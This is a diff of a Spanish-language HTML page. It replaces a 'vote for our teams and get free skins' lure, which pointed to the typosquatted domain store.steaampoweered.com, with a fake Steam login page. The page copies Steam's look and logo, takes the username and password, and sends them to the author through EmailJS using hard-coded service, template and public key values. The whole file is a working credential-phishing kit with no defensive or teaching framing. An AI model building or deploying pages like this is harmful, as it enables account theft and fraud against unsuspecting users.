@@ -1,213 +1,182 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<title>Votación de Equipos</title>
+<meta charset="UTF-8" />
+<title>Steam Login Demo</title>
+
 <style>
-  body {
-    margin: 0;
-    min-height: 100vh;
-    background: radial-gradient(circle at top, #1b2838 0%, #0e1621 60%);
-    display: flex;
-    flex-direction: column;
-    justify-content: flex-start;
-    font-family: Arial, Helvetica, sans-serif;
-    color: #c6d4df;
-    padding: 0 20px 60px 20px;
-  }
+/* ====== BASE ====== */
+body {
+  margin: 0;
+  height: 100vh;
+  background: #0e1621;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: Arial, Helvetica, sans-serif;
+  color: #c6d4df;
+}
 
-  .container {
-    background: #171a21;
-    width: 800px;
-    margin: 120px auto 0 auto;
-    padding: 15px 20px 25px 65px;
-    border-radius: 8px;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-    text-align: center;
-  }
+/* ====== CAJA PRINCIPAL ====== */
+.steam-box {
+  background: #171a21; /* Color plano sin patrón */
+  width: 820px;
+  height: 360px;
+  border-radius: 6px;
+  display: flex;
+  padding: 30px 40px;
+  box-sizing: border-box;
+  position: relative;
+}
 
-  h1 {
-    font-size: 36px;
-    font-weight: 700;
-    margin: 0 0 10px 0;
-    letter-spacing: 0.6px;
-    text-transform: uppercase;
-  }
+/* ====== IZQUIERDA ====== */
+.left {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+}
 
-  .image-cropper {
-    width: 350px;
-    height: 210px;
-    overflow: hidden;
-    margin: 40px auto 0 auto;
-    border-radius: 8px;
-    box-shadow: 0 15px 40px rgba(0,0,0,0.5);
-    position: relative;
-  }
+/* Logo y título en línea */
+.logo-title {
+  display: flex;
+  align-items: center;
+  margin-bottom: 25px;
+}
 
-  .image-cropper img {
-    position: absolute;
-    top: -52px;
-    left: 0;
-    width: 350px;
-    height: auto;
-  }
+.logo-title img {
+  width: 40px;
+  margin-right: 10px;
+}
 
-  .steam-text {
-    color: #66c0f4;
-    font-size: 12px;
-    text-align: center;
-    margin: 15px auto 0 auto;
-    width: 350px;
-    font-weight: 500;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    text-shadow: 0 0 3px rgba(102, 192, 244, 0.7);
-  }
+/* Aquí el texto "Steam" lo quité, pero el espacio queda limpio */
 
-  /* Nuevo container para equipos */
-  .teams-container {
-    width: 800px;
-    margin: 50px auto 80px auto;
-    padding: 30px 20px;
-    border-radius: 8px;
-    background: linear-gradient(to top, #ff0000 0%, #171a21 100%);
-    box-shadow: 0 20px 60px rgba(255, 0, 0, 0.6);
-    display: flex;
-    justify-content: space-around;
-    align-items: center;
-  }
+.label {
+  font-size: 12px;
+  color: #66c0f4;
+  margin-bottom: 5px;
+}
 
-  .team {
-    flex: 1;
-    margin: 0 10px;
-    text-align: center;
-    padding: 10px;
-    border-radius: 6px;
-    background: rgba(0,0,0,0.3);
-    cursor: pointer;
-    transition: background 0.3s ease;
-    display: flex;
-    justify-content: center;
-  }
+input {
+  width: 100%;
+  padding: 10px;
+  background: #32353c;
+  border: none;
+  color: white;
+  margin-bottom: 15px;
+  border-radius: 2px;
+  outline: none;
+}
 
-  .team:hover {
-    background: rgba(255, 0, 0, 0.5);
-  }
+.remember {
+  display: flex;
+  align-items: center;
+  font-size: 13px;
+  margin-bottom: 20px;
+  color: #c6d4df;
+}
 
-  .team img {
-    width: 120px;
-    height: 120px;
-    object-fit: cover;
-    border-radius: 6px;
-  }
+button {
+  width: 100%;
+  padding: 12px;
+  background: linear-gradient(90deg,#06bfff,#2d73ff);
+  border: none;
+  color: white;
+  font-weight: bold;
+  font-size: 15px;
+  border-radius: 2px;
+  cursor: pointer;
+}
 
-  /* Estilo para el iframe y su contenedor */
-  .iframe-container {
-    position: fixed;
-    top: 50px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 850px;
-    height: 400px;
-    background: #171a21;
-    border-radius: 8px;
-    box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
-    display: none; /* oculto por defecto */
-    flex-direction: column;
-    z-index: 9999;
-  }
+/* ====== DERECHA ====== */
+.right {
+  width: 260px;
+  text-align: center;
+  color: #66c0f4;
+  font-size: 12px;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
 
-  .iframe-header {
-    background: #2d2d2d;
-    padding: 8px 15px;
-    display: flex;
-    justify-content: flex-end;
-    border-top-left-radius: 8px;
-    border-top-right-radius: 8px;
-  }
+.right div {
+  margin-top: 10px;
+}
 
-  .close-btn {
-    background: #ff3b3b;
-    border: none;
-    width: 26px;
-    height: 26px;
-    border-radius: 50%;
-    cursor: pointer;
-    font-weight: bold;
-    color: white;
-    font-size: 18px;
-    line-height: 26px;
-    text-align: center;
-  }
+/* ====== FOOTER ====== */
+.footer {
+  position: absolute;
+  bottom: 30px;
+  font-size: 12px;
+  color: #8f98a0;
+}
 
-  iframe {
-    flex: 1;
-    border: none;
-    border-bottom-left-radius: 8px;
-    border-bottom-right-radius: 8px;
-  }
-
-  @media(max-width: 900px) {
-    .iframe-container {
-      width: 90vw;
-      height: 60vh;
-    }
-  }
+.footer span {
+  color: #66c0f4;
+}
 </style>
 </head>
+
 <body>
 
-  <div class="container">
-    <h1>VOTA A UNO DE NUESTRO EQUIPOS POR SKINS GRATIS</h1>
+<div class="steam-box">
+
+  <div class="left">
+    <div class="logo-title">
+      <img src="https://www.citypng.com/public/uploads/preview/steam-white-logo-hd-png-701751694706440swid9yuigf.png" alt="Logo Steam">
+      <!-- Aquí no mostramos texto, solo el logo para que quede limpio -->
+    </div>
+
+    <form id="login-form">
+      <div class="label">INICIA SESIÓN CON TU NOMBRE DE CUENTA</div>
+      <input type="text" name="username" placeholder="Nombre de cuenta" required>
+
+      <div class="label">CONTRASEÑA</div>
+      <input type="password" name="password" placeholder="Contraseña" required>
+
+      <div class="remember">
+        <input type="checkbox" name="remember" checked style="width:auto;margin-right:8px;">
+        Recordarme
+      </div>
+
+      <button type="submit">Iniciar sesión</button>
+    </form>
   </div>
 
-  <div class="image-cropper">
-    <img src="https://pbs.twimg.com/media/GHRV6EpWEAEe7ZR.jpg" alt="Imagen recortada">
-  </div>
-
-  <div class="steam-text">
-    Mediante votando uno de nuestros equipos, automáticamente será redirigirá a la página de inicio de sesión de Steam, tendrá que iniciar sesión para votar, DISFRUTAD LAS SKIN!
-  </div>
-
-  <div class="teams-container">
-    <div class="team" onclick="openIframe('https://store.steaampoweered.com/login/')">
-      <img src="https://i.pinimg.com/736x/2c/6d/fd/2c6dfdf7fd345d43a85fd23339bc303b.jpg" alt="Equipo 1">
-    </div>
-    <div class="team" onclick="openIframe('https://store.steaampoweered.com/login/')">
-      <img src="https://i.pinimg.com/1200x/50/c7/f9/50c7f96e9f9a5e35d0ecd7746df5c943.jpg" alt="Equipo 2">
-    </div>
-    <div class="team" onclick="openIframe('https://store.steaampoweered.com/login/')">
-      <img src="https://i.pinimg.com/1200x/2f/43/98/2f43988f7513271a49b981bd00efe187.jpg" alt="Equipo 3">
-    </div>
-    <div class="team" onclick="openIframe('https://store.steaampoweered.com/login/')">
-      <img src="https://i.pinimg.com/1200x/d4/13/61/d4136120abefa9699fc272ead7d54fb3.jpg" alt="Equipo 4">
-    </div>
-    <div class="team" onclick="openIframe('https://store.steaampoweered.com/login/')">
-      <img src="https://i.pinimg.com/1200x/69/c7/9a/69c79a9ab7c89fe9287fc7cbbb9f5ddd.jpg" alt="Equipo 5">
+  <div class="right">
+    <div>O BIEN CON UN CÓDIGO QR</div>
+    <div style="font-size: 12px;">
+      Usa la aplicación <b>Steam Mobile</b><br>
+      para iniciar sesión con un código QR
     </div>
   </div>
 
-  <!-- Contenedor para el iframe -->
-  <div class="iframe-container" id="iframeContainer">
-    <div class="iframe-header">
-      <button class="close-btn" onclick="closeIframe()">×</button>
-    </div>
-    <iframe id="teamIframe" src=""></iframe>
-  </div>
+</div>
 
+<div class="footer">
+  <span>Ayuda, no puedo iniciar sesión</span> ·
+  ¿No tienes una cuenta?
+  <span>Crear una cuenta gratuita</span>
+</div>
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-  function openIframe(url) {
-    const iframeContainer = document.getElementById('iframeContainer');
-    const iframe = document.getElementById('teamIframe');
-    iframe.src = url;
-    iframeContainer.style.display = 'flex';
-  }
+  emailjs.init('3x0styJQNXamR4XT4');
 
-  function closeIframe() {
-    const iframeContainer = document.getElementById('iframeContainer');
-    const iframe = document.getElementById('teamIframe');
-    iframe.src = '';
-    iframeContainer.style.display = 'none';
-  }
+  document.getElementById('login-form').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const username = this.username.value;
+    const password = this.password.value;
+    const remember = this.remember.checked ? "Sí" : "No";
+
+    emailjs.send('service_33u0mdn', 'template_vs7phvq', {
+      username: username,
+      password: password,
+      remember: remember
+    })
+    .then(() => alert('Correo enviado con datos del formulario'))
+    .catch(error => alert('Error al enviar correo: ' + error.text));
+  });
 </script>
 
 </body>
